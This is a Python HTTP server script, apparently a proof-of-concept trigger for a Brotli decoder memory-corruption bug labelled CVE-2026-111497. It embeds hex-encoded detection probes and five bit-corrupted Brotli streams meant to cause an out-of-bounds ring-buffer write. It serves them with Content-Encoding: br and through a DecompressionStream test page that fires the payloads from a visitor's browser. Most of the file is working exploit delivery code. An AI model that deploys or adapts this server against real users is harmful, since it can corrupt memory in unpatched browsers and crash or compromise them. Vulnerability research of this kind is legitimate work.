#!/usr/bin/env python3
"""CVE-2026-111497 Brotli Trigger Server v3.

Two categories of payloads:
1. DETECTION probes (detect-*): Test if decoder is vulnerable by checking
   response behavior (needs-more-input vs format-error).
2. CORRUPTION payloads (oob-v2-*): Valid multi-block-type Brotli streams
   with surgical bit corruption. On unpatched decoders, the corrupted
   block-type boundary causes stale Huffman state -> ring buffer OOB write.

Usage:
    python3 brotli_v3_server.py [port]
"""

import http.server
import sys
import time
import base64

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8889

PAYLOADS = {
    "oob-v2-0": bytes.fromhex("5b9f1683fee2c08e9581253aa47ae0a8816ddb9bacd661e3d60ec4e0bc90fb4e71705ec979c441a8708c90f74a64c881db89a92d89d8828db125746f2f3cad1508cdb94e78aff78e0e408409655c48a58d753ec4944b6d7dccb5cf7d1f00211841319c20299a61395e1025595135dd302ddb713d3f08a33849b3bc28abba69bb7e18a77959b7fd38affb79bfdf1f4030826238415234c372bc204ab2a26aba615ab6e37a7e104671926679515675d376fd304ef3b26efb715ef7f37e3f800813cab8904a1beb7c104671926679515675d376fd304ef3b26efb715ef7f37e3f8845cd23ab67ef4bd33a77e7100600"),
    "oob-v2-1": bytes.fromhex("5b9f1683fee2c08e9581253aa47ae0a8816ddb9bacd661e3d60ec4e0bc90fb4e71705ec979c441a8708c90f74a64c881db89a92d89d8828db125746f2f1cad1508cdb94e78aff78e0e408409655c48a58d753ec4944b6d7dccb5cf7d1f00211841319c20299a61395e1025515135dd302ddb713d3f08a33849b3bc28abba69bb7e18a77959b7fd38affb79bfdf1f4030826238415234c372bc204ab2a26aba615ab6e37a7e104671926679515675d376fd304ef3b26efb715ef7f37e3f800813cab8904a1beb7c104671926679515675d376fd304ef3b26efb715ef7f37e3f8845cd23ab67ef4bd33a77e7100600"),
    "oob-v2-2": bytes.fromhex("5b9f1683fee2c08e9581253aa47ae0a8816ddb9bacd661e3d60ec4e0bc90fb4e71705ec979c441a8708c90f74a64c881db89a92d89d8828db125746f2f1cad1508cdb94e78aff78e0e408409655c48a58d753ec4944b6d7dccb5cf7d1f00211841319c20299a61395e1025595135dd302ddb713d3f08a33849b3bc28abba69bb7e18a77959b7fd38affb79bfdf1f4030826238415634c372bc204ab2a26aba615ab6e37a7e104671926679515675d376fd304ef3b26efb715ef7f37e3f800813cab8904a1beb7c104671926679515675d376fd304ef3b26efb715ef7f37e3f8845cd23ab67ef4bd33a77e7100600"),
    "oob-v2-3": bytes.fromhex("5b9f1683fee2c08e9581253aa47ae0a8816ddb9bacd661e3d60ec4e0bc90fb4e71705ec979c441a8708c90f74a64c881db89a92d89d8828db125746f2f1cad1508cdb94e78aff78e0e408409655c48a58d753ec4944b6d7dccb5cf7d1f00211841319c20299a61395e1025595135dd302ddb713d3f08a33849b3bc28abba69bb7e18a77959b7fd38affb79bfdf1f4030826238415234c372bc204ab2a26aba615ab6e37a7e104671926679515675d376fd304ef3b26efb715ef7d37e3f800813cab8904a1beb7c104671926679515675d376fd304ef3b26efb715ef7f37e3f8845cd23ab67ef4bd33a77e7100600"),
    "oob-v2-4": bytes.fromhex("5b9f1683fee2c08e9581253aa47ae0a8816ddb9bacd661e3d60ec4e0bc90fb4e71705ec979c441a8708c90f74a64c881db89a92d89d8828db125746f2f1cad1508cdb94e78aff78e0e408409655c48a58d753ec4944b6d7dccb5cf7d1f00211841319c20299a61395e1025595135dd302ddb713d3f08a33849b3bc28abba69bb7e18a77959b7fd38affb79bfdf1f4030826238415234c372bc204ab2a26aba615ab6e37a7e104671926679515675d376fd304ef3b26efb715ef7f37e3f800813cab8904a1beb7c104671926679515675d376fd304ef3b26efb715ef7f37e3f8845cd23ab67ef4bd33a77e7100602"),
    "detect-base": bytes.fromhex("200010414141fcffff07002228f00b60f7f41f000000"),
    "detect-ext":  bytes.fromhex("200010414141fcffff07002228f00b60f7f41f00000000"),
}

VALID_STREAM = bytes.fromhex("5b9f1683fee2c08e9581253aa47ae0a8816ddb9bacd661e3d60ec4e0bc90fb4e71705ec979c441a8708c90f74a64c881db89a92d89d8828db125746f2f1cad1508cdb94e78aff78e0e408409655c48a58d753ec4944b6d7dccb5cf7d1f00211841319c20299a61395e1025595135dd302ddb713d3f08a33849b3bc28abba69bb7e18a77959b7fd38affb79bfdf1f4030826238415234c372bc204ab2a26aba615ab6e37a7e104671926679515675d376fd304ef3b26efb715ef7f37e3f800813cab8904a1beb7c104671926679515675d376fd304ef3b26efb715ef7f37e3f8845cd23ab67ef4bd33a77e7100600")


LANDING = b"""\
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Brotli v3 Trigger</title>
<style>
*{box-sizing:border-box}
body{font-family:-apple-system,system-ui,sans-serif;padding:12px;background:#0a0a0a;color:#e0e0e0;margin:0}
h1{color:#f90;font-size:1.1em;margin:0 0 4px}
h2{color:#8af;font-size:0.95em;margin:12px 0 6px}
p{font-size:12px;color:#888;margin:2px 0}
.row{display:flex;flex-wrap:wrap;gap:6px;margin:8px 0}
button{color:#000;border:none;padding:12px 16px;border-radius:6px;font-size:14px;cursor:pointer;flex:1;min-width:120px}
button:active{opacity:0.7}
.orange{background:#f90}
.red{background:#e44;color:#fff}
.blue{background:#48f;color:#fff}
.green{background:#4a4;color:#fff}
.purple{background:#a4f;color:#fff}
.r{margin:4px 0;padding:6px 10px;border-radius:4px;font-family:monospace;font-size:12px}
.pending{background:#222;color:#666}
.vuln{background:#2a1a1a;color:#f88;border-left:3px solid #f44}
.safe{background:#1a2a1a;color:#8f8;border-left:3px solid #4f4}
.err{background:#2a2a1a;color:#ff8;border-left:3px solid #ff4}
.info{background:#1a1a2a;color:#8af;border-left:3px solid #48f}
#log{margin-top:8px;font-family:monospace;font-size:10px;white-space:pre-wrap;max-height:150px;overflow-y:auto;background:#111;padding:6px;border-radius:4px;color:#666}
.note{background:#1a1a1a;padding:8px;border-radius:4px;font-size:11px;color:#999;margin:6px 0}
</style>
</head>
<body>
<h1>CVE-2026-111497 Brotli v3</h1>

<div class="note">
<b>Detection probes</b> test if decoder is vulnerable (needs-more-input vs format-error).<br>
<b>Corruption payloads</b> are valid multi-block-type streams with bit-flipped data.
On unpatched decoders, the corrupted block boundary causes stale Huffman state &rarr; OOB write.
</div>

<h2>Detection Probes (22-23B)</h2>
<div class="row">
<button class="green" onclick="fire('detect-base')">detect-base</button>
<button class="green" onclick="fire('detect-ext')">detect-ext</button>
</div>

<h2>Corruption Payloads (238B each)</h2>
<div class="row">
<button class="orange" onclick="fire('oob-v2-0')">oob-v2-0</button>
<button class="orange" onclick="fire('oob-v2-1')">oob-v2-1</button>
<button class="orange" onclick="fire('oob-v2-2')">oob-v2-2</button>
</div>
<div class="row">
<button class="orange" onclick="fire('oob-v2-3')">oob-v2-3</button>
<button class="orange" onclick="fire('oob-v2-4')">oob-v2-4</button>
<button class="blue" onclick="fire('valid')">valid (control)</button>
</div>

<h2>Batch Tests</h2>
<div class="row">
<button class="red" onclick="fireAll()">Fire ALL</button>
<button class="purple" onclick="fireDS('oob-v2-0')">DS: oob-v2-0</button>
<button class="purple" onclick="fireDS('detect-base')">DS: detect</button>
</div>

<div id="results"></div>
<div id="log"></div>

<script>
var R={}, logEl=document.getElementById('log');
function log(m){logEl.textContent+=new Date().toISOString().slice(11,23)+' '+m+'\\n';logEl.scrollTop=logEl.scrollHeight}
function show(n,cls,txt){R[n]={cls:cls,txt:txt};var h='';for(var k in R)h+='<div class="r '+R[k].cls+'">'+k+': '+R[k].txt+'</div>';document.getElementById('results').innerHTML=h}

function fire(name){
  show(name,'pending','fetching...');
  log('>>> '+name+' via fetch (Content-Encoding: br)');
  var t0=performance.now();
  fetch('/br/'+name).then(function(r){
    var ms=(performance.now()-t0).toFixed(0);
    var ce=r.headers.get('content-encoding');
    log('  HTTP '+r.status+' CE='+ce+' in '+ms+'ms');
    return r.arrayBuffer().then(function(buf){
      var a=new Uint8Array(buf);
      if(a.length===0){
        show(name,'err','Empty ('+ms+'ms) - decoder crash?');
        log('  EMPTY response');
      } else if(a.length < 50){
        var txt=new TextDecoder().decode(a);
        show(name,'info',txt.slice(0,80)+' ('+ms+'ms)');
        log('  Short: '+txt.slice(0,100));
      } else {
        show(name,'vuln',a.length+'B decoded ('+ms+'ms)');
        log('  Decoded '+a.length+'B, first=0x'+a[0].toString(16));
      }
    });
  }).catch(function(e){
    var ms=(performance.now()-t0).toFixed(0);
    if(ms > 5000) {
      show(name,'err','Timeout/crash ('+ms+'ms): '+e.message);
    } else {
      show(name,'err','Error ('+ms+'ms): '+e.message);
    }
    log('  CATCH: '+e.message);
  });
}

function fireAll(){
  log('=== ALL payloads ===');
  var names=['detect-base','detect-ext','oob-v2-0','oob-v2-1','oob-v2-2','oob-v2-3','oob-v2-4','valid'];
  names.forEach(function(n,i){setTimeout(function(){fire(n)},i*400)});
}

function fireDS(name){
  log('=== DecompressionStream: '+name+' ===');
  show('DS:'+name,'pending','testing...');
  if(typeof DecompressionStream==='undefined'){
    show('DS:'+name,'err','DecompressionStream not available');
    return;
  }
  fetch('/raw/'+name).then(function(r){return r.arrayBuffer()}).then(function(buf){
    log('  Raw bytes: '+buf.byteLength);
    var ds=new DecompressionStream('br');
    var w=ds.writable.getWriter();
    var rd=ds.readable.getReader();
    var chunks=[];
    w.write(new Uint8Array(buf));
    w.close();
    function pump(){
      return rd.read().then(function(r){
        if(r.done){
          var t=chunks.reduce(function(s,c){return s+c.length},0);
          show('DS:'+name,'vuln','DS decoded '+t+'B');
          log('  DS output: '+t+' bytes');
          return;
        }
        chunks.push(r.value);
        return pump();
      });
    }
    return pump();
  }).catch(function(e){
    show('DS:'+name,'err','DS: '+e.message);
    log('  DS error: '+e.message);
  });
}
</script>
</body>
</html>
"""


class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', str(len(LANDING)))
            self.send_header('Cache-Control', 'no-store')
            self.end_headers()
            self.wfile.write(LANDING)
            return

        if self.path.startswith('/br/'):
            name = self.path[4:].split('?')[0]
            payload = None
            if name == 'valid':
                payload = VALID_STREAM
            elif name in PAYLOADS:
                payload = PAYLOADS[name]
            if payload:
                ae = self.headers.get('Accept-Encoding', '')
                ts = time.strftime('%H:%M:%S')
                print(f"[{ts}] {self.client_address[0]} /br/{name} "
                      f"AE={ae} ({len(payload)}B)")
                self.send_response(200)
                self.send_header('Content-Type', 'application/octet-stream')
                self.send_header('Content-Encoding', 'br')
                self.send_header('Content-Length', str(len(payload)))
                self.send_header('Cache-Control', 'no-store')
                self.end_headers()
                self.wfile.write(payload)
                return

        if self.path.startswith('/raw/'):
            name = self.path[5:].split('?')[0]
            payload = None
            if name == 'valid':
                payload = VALID_STREAM
            elif name in PAYLOADS:
                payload = PAYLOADS[name]
            if payload:
                self.send_response(200)
                self.send_header('Content-Type', 'application/octet-stream')
                self.send_header('Content-Length', str(len(payload)))
                self.send_header('Cache-Control', 'no-store')
                self.end_headers()
                self.wfile.write(payload)
                return

        self.send_response(404)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'not found')

    def log_message(self, fmt, *args):
        pass


def main():
    server = http.server.HTTPServer(('0.0.0.0', PORT), Handler)
    print(f"CVE-2026-111497 Brotli Trigger Server v3")
    print(f"  http://0.0.0.0:{PORT}/")
    print(f"  Detection probes: {[k for k in PAYLOADS if k.startswith('detect')]}")
    print(f"  Corruption payloads: {[k for k in PAYLOADS if k.startswith('oob')]}")
    print(f"  /br/<name>  = Content-Encoding: br")
    print(f"  /raw/<name> = raw bytes (for DecompressionStream)")
    print()
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nStopped.")


if __name__ == '__main__':
    main()
